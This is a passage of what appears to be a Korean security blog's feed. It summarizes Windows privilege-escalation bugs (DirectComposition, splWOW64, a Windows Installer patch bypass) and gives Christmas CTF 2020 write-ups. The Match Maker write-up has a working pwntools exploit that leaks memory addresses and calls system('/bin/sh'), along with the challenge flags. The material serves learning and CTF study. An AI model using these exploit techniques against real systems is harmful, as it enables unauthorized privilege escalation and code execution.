    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%20exploit.html">CVE-2020-17057 Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft가 2년 전에 발견한 취약점을 패치함으로써 취약점의 세부 정보가 공개되었습니다. 해당 취약점은 Windows 커널 모드의 그래픽 구성 요소인 <code>DirectComposition</code> 에서 발생하는 초기화되지 않은 pool 메모리 참조입니다.</p><p><code>DirectComposition</code> 은 리소스 생성/해제/속성 설정 등의 작업을 수행하는 <code>NtDCompositionProcessChannelBatchBuffer</code> syscall을 사용합니다.</p><p><code>DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> 에서는 한 쌍의 리소스 객체를 처리합니다. 첫 번째 리소스 객체가 초기화되고 두 번째 리소스 객체 타입이 <code>0x57</code>이 아니라면 두 번째 리소스 객체가 초기화되지 않습니다.</p><p>이후 <code>DirectComposition::CInteractionTrackerMarshaler::ReleaseManipulationReferences</code> 에서 할당된 한 쌍의 리소스 객체를 해제하기 위해 별도의 검증 없이<code>DirectComposition::CApplicationChannel::ReleaseResource</code> 을 호출하는데, 이때 초기화되지 않은 두 번째 리소스 객체 포인터를 참조하게 되어 커널 크래시가 발생합니다.</p><p>이를 악용하면 리소스 객체 포인터 테이블을 spray 해 임의 객체를 해제하는 등 해제된 메모리를 조작할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized pointer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-0986: Windows splWOW64 Elevation of Privilege</title>
    <link href="/2020/12/31/idioth/2020-12-31/"/>
    <url>/2020/12/31/idioth/2020-12-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096">Issue 2096: Windows: splWOW64 Elevation of Privilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 2004 (19041.508)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>5월에 Kaspersky는 Windows splWOW64의 Elevation of Privilege가 악용되고 있음을 발견했습니다. Microsoft에서 6월에 패치를 발표했지만 해당 취약점은 수정되지 않았습니다.</p><p>CVE-2020-0986은 GDI Print/Print Spooler API의 arbitrary pointer 역참조 취약점입니다. 이 취약점을 이용하여 low integrity 프로세스는 splwow64.exe(medium integrity)에 LPC 메시지를 보내 splwow64의 메모리 영역에 쓰기 권한을 얻을 수 있습니다. </p><p>splWOW64는 <code>GdiPrinterThunk</code>로 LPC 메시지를 전달합니다. <code>GdiPrinterThunk</code>의 <code>INDEX_DocumnetEvent</code>에 해당 취약점이 포함되어 있습니다. <code>INDEX_DocumentEvent</code>의 핸들러는 printer command(LPC 클라이언트를 통해 조작 가능)를 통해 유효한 핸들을 가진 프린터의 명령인지 확인합니다.</p><p>확인하고 나면 <code>DecodePointer</code> 함수를 사용하여 <code>fpDocumnetEvent</code>의 전역 변수에 저장된 함수의 포인터를 decode 한 후 decode 된 포인터를 통해 함수를 실행하고 <code>memcpy</code>를 호출합니다. 해커는 <code>memcpy</code>를 통해 복사되는 내용과 바이트 수, destination을 제어할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary pointer dereference</tag>
      
      <tag>lpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Installer EoP 6th patch bypass</title>
    <link href="/2020/12/30/fabu1ous/2020-12-30/"/>
    <url>/2020/12/30/fabu1ous/2020-12-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>에 대한 패치 우회가 공개되었습니다. CVE-2019-1415로 처음 제보된 Windows Installer EoP 취약점의 6번째 패치 우회입니다. </p><p>CVE-2020-16902의 내용은 다음과 같습니다. Windows Installer는 설치 작업 실패를 대비해 설치 작업 중 삭제되는 파일과 롤백 스크립트를<code> C:\Config.Msi</code> 디렉터리에 백업합니다. 백업 전에 <code>C:\Config.Msi</code> 디렉터리를 삭제하고 재생성하는 로직이 있는데 <code>Setsecurity()</code>의 race condition 취약점 패턴이 남아있어 악용이 가능합니다.</p><p>따라서 <code>C:\Config.Msi</code>를 삭제하고 <code>C:\Config.Msi</code>이 여전히 존재한다면(race-con 트리거 조건) <code>C:\Config.Msi</code> 대신 <code>C:\windows\install\config.msi</code>에 롤백 파일을 백업하도록 패치되었습니다. </p><p>하지만 다음과 같은 이유로 우회가 가능합니다. 만약 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키가 존재하면 그대로 <code>C:\Config.Msi</code>를 백업에 사용합니다.  <code>C:\Config.Msi</code>를 삭제한 후 <code>C:\Config.Msi</code>의 삭제 여부를 한번 더 체크한 다음 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키를 삭제합니다.  <code>C:\Config.Msi</code>가 삭제된 직후 <code>C:\Config.Msi</code>를 생성하면 레지스트리 키가 삭제되지 않습니다. Windows Installer는 <code>C:\Config.Msi</code>를 백업에 사용하게 되고 이전 취약점들을 그대로 악용할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
    <link href="/2020/12/29/fabu1ous/match-maker/"/>
    <url>/2020/12/29/fabu1ous/match-maker/</url>
    
    <content type="html"><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>프로필을 만듭니다.</p><ul><li>이름, 나이, 성별, 취미를 입력</li><li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li></ul></li><li><p>만든 프로필을 저장합니다.</p><ul><li>만들어진 프로필을 힙에 저장</li><li>성별을 구분하여 전역 배열에 힙 주소 저장.</li></ul></li><li><p>파트너 매칭을 합니다.</p></li><li><p>매칭 된 파트너의 정보를 출력합니다.</p></li><li><p>유저 리스트를 출력합니다.</p><ul><li>현재 프로필이 남자면 여자 리스트를 출력</li><li>현재 프로필이 여자면 남자 리스트를 출력</li></ul></li></ol><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p><p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>int overflow → uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>성별은 int로 입력받습니다.</p><p>0 : 남자</p><p>1 : 여자</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - No g</title>
    <link href="/2020/12/29/fabu1ous/no-g/"/>
    <url>/2020/12/29/fabu1ous/no-g/</url>
    
    <content type="html"><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png"></p><p>음계(Scale)를 알파벳으로 나타내곤 합니다. 음이름이라고 하죠.</p><p>라(A), 시(B), 도(C), 레(D), 미(E) , 파(F), 솔(G)</p><p>16진수(HEX) 또한 알파벳을 사용해 수를 표현합니다.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg"></p><p>악보에 그려진 음표를 알파벳으로, 그 알파벳을 hex값으로 치환하고 연결된 음표들끼리 hex값을 더해 ASCII로 변환하면 하나의 문자가 됩니다.</p><p>예 ) 라라라 → chr(0xa+0xa+0xa) → ‘\x1e’</p><p>hex에는 G가 없기 때문에 악보의 제목이 ‘No G’입니다. </p><p>제가 의도한 풀이 접근 방식은 이렇습니다.</p><ol><li>제목에서 힌트를 얻어 음이름을 찾아본다.</li><li>첫 여섯 음의 hex값을 더해봤더니 ‘X’가 나온다.</li><li>flag 형식이 ‘XMAS{}’이므로 2번 과정을 몇 번 더 반복해 본다.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&#x27;la&#x27;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;ti&#x27;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;do&#x27;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;re&#x27;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;mi&#x27;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;fa&#x27;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS&#123;XMAS&#123;7XMAS&#123;7hXMAS&#123;7heXMAS&#123;7herXMAS&#123;7her3XMAS&#123;7her3_XMAS&#123;7her3_iXMAS&#123;7her3_i5XMAS&#123;7her3_i5_XMAS&#123;7her3_i5_nXMAS&#123;7her3_i5_noXMAS&#123;7her3_i5_no_XMAS&#123;7her3_i5_no_GXMAS&#123;7her3_i5_no_G_XMAS&#123;7her3_i5_no_G_iXMAS&#123;7her3_i5_no_G_inXMAS&#123;7her3_i5_no_G_in_XMAS&#123;7her3_i5_no_G_in_HXMAS&#123;7her3_i5_no_G_in_H3XMAS&#123;7her3_i5_no_G_in_H3XXMAS&#123;7her3_i5_no_G_in_H3X&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>misc</tag>
      
      <tag>scale</tag>
      
      <tag>hex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - oil system</title>
    <link href="/2020/12/29/fabu1ous/oil-system/"/>
    <url>/2020/12/29/fabu1ous/oil-system/</url>
    
